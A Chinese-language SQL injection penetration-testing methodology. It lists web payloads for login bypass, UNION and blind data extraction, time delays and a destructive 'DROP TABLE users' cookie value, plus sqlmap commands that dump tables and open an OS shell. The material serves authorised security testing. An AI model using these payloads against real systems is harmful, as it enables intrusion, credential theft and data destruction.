# SQL 注入测试方法论文档

---

# 第一部分：文档概述

## 1.1 编写目的
为渗透测试人员提供 SQL 注入漏洞的系统化测试流程，确保对使用关系型数据库的应用进行全面、标准化的 SQL 注入测试覆盖。

## 1.2 适用范围
适用于使用 MySQL、PostgreSQL、Oracle、SQL Server、SQLite 等关系型数据库的 Web 应用、API 接口和移动应用后端。

## 1.3 读者对象
本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 专题：SQL 注入系统化测试

### 2.1 技术介绍

SQL 注入测试是指通过系统化的方法，检测应用中所有可能的 SQL 注入点，并验证其可利用性。测试应覆盖所有类型的 SQL 注入（联合查询、错误回显、盲注、堆叠查询等）和所有类型的数据库。

### 2.2 测试范围

| 测试对象 | 测试内容 |
|---------|---------|
| **输入点** | GET 参数、POST 参数、HTTP 头、Cookie |
| **数据库类型** | MySQL、PostgreSQL、Oracle、SQL Server、SQLite |
| **注入类型** | 联合查询、错误回显、布尔盲注、时间盲注、堆叠查询 |
| **业务功能** | 登录、搜索、筛选、排序、分页、导出 |

### 2.3 测试流程

#### 2.3.1 输入点发现与枚举

**步骤 1：爬虫抓取**
```
# 使用工具爬取所有可达页面
gobuster dir -u http://target -w common.txt
dirb http://target
```

**步骤 2：参数收集**
```
# 识别所有输入点
- URL 查询参数：?id=1&name=test
- POST 表单数据
- HTTP 头：User-Agent、Referer、X-Forwarded-For
- Cookie 值
- 文件上传参数
- JSON/XML 请求体
```

**步骤 3：参数类型分析**
```
# 数值型参数
id=1, page=2, sort=3

# 字符串型参数
name=admin, search=test, category=electronics

# 特殊格式参数
date=2024-01-01, json={"key":"value"}
```

#### 2.3.2 初步探测

**通用探测 Payload：**

```
# 单引号测试（字符串型）
id=1'
name=admin'

# 双引号测试
id=1"
name=admin"

# 数学运算测试（数值型）
id=1-1
id=1*1
id=1+1

# 布尔测试
id=1 AND 1=1
id=1 AND 1=2

# 时间延迟测试
id=1; WAITFOR DELAY '0:0:5'--
id=1; SELECT pg_sleep(5)--
id=1; SELECT sleep(5)--

# 注释测试
id=1--
id=1#
id=1/*
```

**响应分析：**
- SQL 错误信息（数据库类型识别）
- 页面内容变化
- 响应时间差异
- HTTP 状态码变化

#### 2.3.3 数据库类型识别

**错误信息识别：**

| 错误信息特征 | 数据库类型 |
|------------|-----------|
| `MySQL server version` | MySQL |
| `ORA-00933` | Oracle |
| `PostgreSQL error` | PostgreSQL |
| `SQL Server` / `ODBC SQL Server` | SQL Server |
| `SQLite3::SQLException` | SQLite |

**函数探测：**

```
# MySQL
AND SLEEP(5)
AND BENCHMARK(10000000,SHA1('test'))

# PostgreSQL
; SELECT pg_sleep(5)

# SQL Server
; WAITFOR DELAY '0:0:5'

# Oracle
; BEGIN DBMS_LOCK.SLEEP(5); END;
```

#### 2.3.4 注入类型判断

**联合查询注入检测：**
```
# 判断列数
ORDER BY 1--
ORDER BY 2--
...
ORDER BY N--  # 出现错误时的 N-1 为列数

# 判断显示位置
UNION SELECT NULL--
UNION SELECT NULL,NULL--
...
UNION SELECT 1,2,3--  # 观察页面显示
```

**错误回显注入检测：**
```
# 触发错误
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--

# 观察是否返回数据库信息
```

**布尔盲注检测：**
```
# 真条件
id=1 AND 1=1--

# 假条件
id=1 AND 1=2--

# 观察页面差异
```

**时间盲注检测：**
```
# 注入时间延迟
id=1 AND SLEEP(5)--

# 观察响应时间
```

### 2.4 测试用例清单

#### 2.4.1 认证功能测试

```
# 登录绕过
username=admin'--
password=anything

username=' OR '1'='1'--
password=' OR '1'='1'--

username=admin' AND '1'='1
password=test

# 用户名枚举
username=admin' AND SUBSTRING(password,1,1)='a'--
```

#### 2.4.2 搜索功能测试

```
# 基础测试
search=' OR '1'='1--

# 联合查询
search=' UNION SELECT NULL,NULL,version()--

# 盲注
search=' AND SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1)='a'--
```

#### 2.4.3 排序功能测试

```
# ORDER BY 注入
sort=id
sort=id DESC
sort=1
sort=1;WAITFOR DELAY '0:0:5'--

# 盲注
sort=(CASE WHEN (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a' THEN id ELSE (SELECT 1 UNION SELECT 1) END)--
```

#### 2.4.4 HTTP 头测试

```
# User-Agent
User-Agent: ' OR '1'='1--
User-Agent: '; WAITFOR DELAY '0:0:5'--

# Referer
Referer: ' UNION SELECT NULL,version()--

# X-Forwarded-For
X-Forwarded-For: 127.0.0.1' OR '1'='1--

# Cookie
Cookie: session=admin'--
Cookie: id=1; DROP TABLE users--
```

### 2.5 自动化测试工具

#### SQLMap 使用指南

```bash
# 基础扫描
sqlmap -u "http://target/page?id=1"

# POST 参数测试
sqlmap -u "http://target/login" --data="username=admin&password=test"

# Cookie 测试
sqlmap -u "http://target/admin" --cookie="session=abc123"

# 指定数据库类型
sqlmap -u "http://target/page?id=1" --dbms=mysql

# 获取所有数据库
sqlmap -u "http://target/page?id=1" --dbs

# 获取表
sqlmap -u "http://target/page?id=1" -D database --tables

# 获取列
sqlmap -u "http://target/page?id=1" -D database -T users --columns

# 获取数据
sqlmap -u "http://target/page?id=1" -D database -T users --dump

# 获取 Shell
sqlmap -u "http://target/page?id=1" --os-shell

# WAF 绕过
sqlmap -u "http://target/page?id=1" --tamper=space2comment
```

### 2.6 测试报告要点

测试完成后，报告应包含：
1. 所有测试的输入点列表
2. 发现的漏洞点及详情
3. 数据库类型和版本
4. 注入类型分类
5. 潜在影响评估
6. 修复建议

---

# 第三部分：附录

## 3.1 各数据库测试 Payload 速查表

| 操作 | MySQL | PostgreSQL | SQL Server | Oracle |
|-----|-------|------------|------------|--------|
| **版本查询** | `SELECT version()` | `SELECT version()` | `SELECT @@version` | `SELECT * FROM v$version` |
| **当前用户** | `SELECT user()` | `SELECT current_user` | `SELECT SYSTEM_USER` | `SELECT user FROM dual` |
| **当前数据库** | `SELECT database()` | `SELECT current_database()` | `SELECT DB_NAME()` | `SELECT global_name FROM global_name` |
| **时间延迟** | `SELECT SLEEP(5)` | `SELECT pg_sleep(5)` | `WAITFOR DELAY '0:0:5'` | `BEGIN DBMS_LOCK.SLEEP(5); END;` |
| **列名分隔** | `FIND_IN_SET()` | 使用 LIMIT | `TOP` | `ROWNUM` |

## 3.2 信息收集 SQL 语句

```sql
-- 获取所有数据库
SELECT schema_name FROM information_schema.schemata;  -- MySQL/PG
SELECT name FROM sys.databases;  -- SQL Server

-- 获取所有表
SELECT table_name FROM information_schema.tables WHERE table_schema='database';

-- 获取所有列
SELECT column_name FROM information_schema.columns WHERE table_name='table';

-- 获取表数据
SELECT * FROM table_name LIMIT 10;
```

## 3.3 参考资源

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQLMap Documentation](https://sqlmap.org/)
- [PortSwigger - SQL Injection](https://portswigger.net/web-security/sql-injection)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
